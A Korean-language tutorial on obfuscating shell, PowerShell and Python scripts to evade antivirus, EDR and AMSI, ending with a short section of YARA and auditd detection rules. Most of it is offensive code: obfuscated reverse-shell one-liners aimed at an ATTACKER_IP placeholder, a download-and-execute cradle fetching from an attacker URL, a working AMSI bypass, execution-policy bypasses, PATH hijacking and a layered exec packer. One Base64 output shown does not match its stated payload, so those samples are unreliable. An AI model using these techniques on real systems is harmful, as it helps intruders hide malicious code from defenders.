# 셸 스크립트 난독화 및 탐지 우회

## 개요

안티바이러스, EDR(Endpoint Detection and Response), SIEM 등이 탐지하는 시그니처를 우회하기 위해 다양한 난독화 기법이 사용된다. 방어자 입장에서도 이 기법들을 이해해야 효과적인 탐지 규칙을 만들 수 있다.

---

## Bash 난독화 기법

### 기법 1: 변수를 이용한 문자열 분할

```bash
# 원본 (탐지됨)
nc -e /bin/bash ATTACKER_IP 4444

# 난독화: 변수 분할
a="n"; b="c"; c=" -e /bin/bash "
d="ATTACKER_IP"; e=" 4444"
${a}${b}${c}${d}${e}

# 배열로 분할
cmd=(n c ' ' - e ' ' / b i n / b a s h ' ' A T T A C K E R _ I P ' ' 4 4 4 4)
"${cmd[@]}"
```

### 기법 2: Base64 인코딩

```bash
# 페이로드 인코딩
PAYLOAD='nc -e /bin/bash ATTACKER_IP 4444'
ENCODED=$(echo "$PAYLOAD" | base64)
echo $ENCODED
# bXBxdHBlIHVlIC1lIC9iaW4vYmFzaCBBVFRBQ0tFUl9JUCA0NDQ0Cg==

# 실행
echo $ENCODED | base64 -d | bash

# 다중 레이어
echo $ENCODED | base64 -d | base64 -d | bash

# 원라이너
bash -c "$(echo 'bmMgLWUgL2Jpbi9iYXNoIEFUVEFDS0VSX0lQIDQ0NDQK' | base64 -d)"
```

### 기법 3: hex 인코딩

```bash
# 문자를 hex로 변환
STRING="whoami"
HEX=$(echo -n "$STRING" | xxd -p | tr -d '\n')
echo $HEX  # 77686f616d69

# hex를 명령어로 실행
$(echo -e "\x77\x68\x6f\x61\x6d\x69")

# Python으로 변환 자동화
python3 -c "print(''.join(f'\\\\x{c:02x}' for c in b'whoami'))"
```

### 기법 4: IFS(Internal Field Separator) 조작

```bash
# 기본 IFS는 공백/탭/개행
# IFS를 문자로 설정하면 해당 문자가 구분자 역할

IFS=_
cmd=nc_-e_/bin/bash_ATTACKER_IP_4444
$cmd

# 또는 특수문자로 분할
IFS='@'
c='nc@-e@/bin/bash@ATTACKER_IP@4444'
$c
```

### 기법 5: eval과 간접 참조

```bash
# eval 체인
cmd1='eva'
cmd2='l'
${cmd1}${cmd2} "whoami"

# $() 중첩
$($(echo "echo") "whoami" | $(echo "bash"))

# 프로세스 치환
bash <(echo 'whoami')
bash <(base64 -d <<< 'd2hvYW1pCg==')
```

### 기법 6: 환경변수 활용

```bash
# PATH 조작으로 명령어 위치 숨기기
export PATH=/tmp:$PATH
cp /bin/bash /tmp/ls
ls  # 실제로는 bash 실행됨

# 환경변수에 명령 저장
export X='bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
eval $X

# IFS를 이용한 환경변수 분리
X="whoami"
${!X}  # 변수의 값을 변수명으로 사용
```

---

## PowerShell 난독화

### 기법 1: 대소문자 혼합 (PowerShell 대소문자 무감)

```powershell
# 원본
Invoke-Expression "whoami"

# 대소문자 혼합 (탐지 우회)
InVoKe-ExPrEsSiOn "whoami"
iEx "whoami"
```

### 기법 2: 백틱(`) 삽입

```powershell
# PowerShell에서 백틱은 이스케이프 문자
# 문자 사이에 삽입해도 같은 의미

i`E`x "who`ami"
In`vo`ke-Ex`pr`es`sion "who`ami"
```

### 기법 3: 문자열 조합

```powershell
# 문자 분할 후 합치기
$a = "Inv"; $b = "oke-"; $c = "Expression"
& ($a + $b + $c) "whoami"

# char 배열에서 조합
$cmd = [char]73 + [char]110 + [char]118 + [char]111 + [char]107 + [char]101
# = "Invoke"

# -join 연산자
$s = "w","h","o","a","m","i" -join ""
Invoke-Expression $s
```

### 기법 4: Base64 인코딩 (PowerShell 내장)

```powershell
# 명령을 Base64로 인코딩 (UTF-16LE 필수)
$cmd = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
Write-Host $encoded

# 실행
powershell -EncodedCommand $encoded

# 원라이너 생성
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')"
$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
[Convert]::ToBase64String($bytes)
```

---

## AMSI(Anti-Malware Scan Interface) 우회

AMSI는 스크립트 실행 전 메모리 내용을 AV 엔진에 전달한다.

### 개념: amsiInitFailed 설정

```powershell
# amsi.dll의 AmsiScanBuffer 함수 패치 (교육 목적)
# 실제 코드는 다양한 탐지 우회 기법으로 난독화됨

# 원리: amsiContext 구조체의 amsiInitFailed를 True로 설정
# PowerShell이 AMSI 초기화 실패로 인식하여 스캔 스킵

$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

### PowerShell 실행 정책 우회

```powershell
# 정책 우회 방법들 (환경마다 효과 다름)

# 방법 1: -ExecutionPolicy 플래그
powershell -ExecutionPolicy Bypass -File script.ps1

# 방법 2: 파이프로 전달
Get-Content script.ps1 | PowerShell.exe -NoProfile -

# 방법 3: 인코딩
powershell -EncodedCommand BASE64_CMD

# 방법 4: 환경변수
$env:PSExecutionPolicyPreference = "bypass"
```

---

## VM/샌드박스 감지

악성코드가 분석 환경을 감지하는 기법 (방어자가 탐지 기준으로 활용):

```python
#!/usr/bin/env python3
"""샌드박스 환경 탐지 지표 확인 (방어 목적 분석)"""

import os
import platform
import subprocess
import sys
import time


def check_vm_artifacts() -> list[str]:
    indicators: list[str] = []

    # 가상화 관련 프로세스
    vm_processes = {"vmtoolsd", "vmwaretray", "vboxservice", "sandboxie"}
    try:
        result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
        running = result.stdout.lower()
        for proc in vm_processes:
            if proc in running:
                indicators.append(f"VM 프로세스 탐지: {proc}")
    except Exception:
        pass

    # 가상화 디바이스 파일
    vm_devices = [
        "/dev/vmware",
        "/.vboxclient",
        "/proc/vz",
        "/proc/xen",
    ]
    for dev in vm_devices:
        if os.path.exists(dev):
            indicators.append(f"VM 디바이스: {dev}")

    # CPU 코어 수 (샌드박스는 보통 1-2개)
    cpu_count = os.cpu_count() or 0
    if cpu_count <= 2:
        indicators.append(f"CPU 코어 수 적음: {cpu_count}")

    # 메모리 크기 확인
    try:
        with open("/proc/meminfo") as f:
            for line in f:
                if "MemTotal" in line:
                    kb = int(line.split()[1])
                    if kb < 2 * 1024 * 1024:  # 2GB 미만
                        indicators.append(f"메모리 적음: {kb // 1024}MB")
    except Exception:
        pass

    # 타이밍 공격 (샌드박스는 CPUID 명령이 느림)
    # 실제 구현은 어셈블리 레벨 필요

    return indicators


def check_user_activity() -> list[str]:
    indicators: list[str] = []

    # 홈 디렉토리 파일 수 확인 (샌드박스는 보통 비어있음)
    home = os.path.expanduser("~")
    file_count = sum(1 for _ in os.scandir(home))
    if file_count < 5:
        indicators.append(f"홈 디렉토리 파일 적음: {file_count}개")

    # 브라우저 히스토리 확인
    browser_paths = [
        os.path.expanduser("~/.mozilla/firefox"),
        os.path.expanduser("~/.config/google-chrome"),
    ]
    has_browser = any(os.path.exists(p) for p in browser_paths)
    if not has_browser:
        indicators.append("브라우저 히스토리 없음")

    return indicators


if __name__ == "__main__":
    print("[*] 환경 분석 중...")
    vm_indicators = check_vm_artifacts()
    user_indicators = check_user_activity()

    all_indicators = vm_indicators + user_indicators
    if all_indicators:
        print("[!] 분석 환경 가능성:")
        for ind in all_indicators:
            print(f"  - {ind}")
    else:
        print("[+] 일반 환경으로 판단")
```

---

## Python 스크립트 패킹 도구

```python
#!/usr/bin/env python3
"""
Script Packer - Python 스크립트 난독화 (교육 목적)
사용법: python3 packer.py --input script.py --output packed.py --layers 3
"""

import argparse
import base64
import zlib
from pathlib import Path


def pack_layer(code: str) -> str:
    compressed = zlib.compress(code.encode())
    encoded = base64.b64encode(compressed).decode()
    return (
        f"import zlib, base64\n"
        f"exec(zlib.decompress(base64.b64decode('{encoded}')))\n"
    )


def pack_script(input_path: Path, output_path: Path, layers: int) -> None:
    code = input_path.read_text()

    print(f"[*] 원본 크기: {len(code)} bytes")

    for i in range(layers):
        code = pack_layer(code)
        print(f"[*] 레이어 {i+1} 적용: {len(code)} bytes")

    output_path.write_text(code)
    print(f"[+] 패킹 완료: {output_path}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Script Packer - 스크립트 난독화 (교육/연구 목적)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--input", type=Path, required=True, help="입력 스크립트")
    parser.add_argument("--output", type=Path, required=True, help="출력 파일")
    parser.add_argument("--layers", type=int, default=2, help="난독화 레이어 수 (기본: 2)")

    args = parser.parse_args()

    if not args.input.exists():
        print(f"[-] 파일 없음: {args.input}")
        raise SystemExit(1)

    pack_script(args.input, args.output, args.layers)


if __name__ == "__main__":
    main()
```

---

## 방어 측 탐지 방법

### YARA 규칙 작성

```yara
rule PowerShell_Base64_Encoded {
    meta:
        description = "Base64 인코딩된 PowerShell 명령 탐지"
    strings:
        $b64_flag = "-EncodedCommand" nocase
        $b64_flag2 = "-enc" nocase
        $iex = "Invoke-Expression" nocase
        $iex2 = "IEX" nocase
    condition:
        1 of them
}

rule Bash_Base64_Execution {
    meta:
        description = "Base64 디코딩 후 bash 실행 탐지"
    strings:
        $decode = "base64 -d" ascii
        $decode2 = "base64 --decode" ascii
        $exec = "| bash" ascii
        $exec2 = "| sh" ascii
    condition:
        any of ($decode*) and any of ($exec*)
}
```

### 로그 기반 탐지 (Auditd)

```bash
# /etc/audit/rules.d/obfuscation.rules
# base64 명령 실행 탐지
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/base64 -k base64_exec

# eval 사용 탐지 (bash -c 경유)
-a always,exit -F arch=b64 -S execve -F exe=/bin/bash \
  -F arg1=-c -k bash_eval

# xxd 사용
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/xxd -k xxd_exec
```
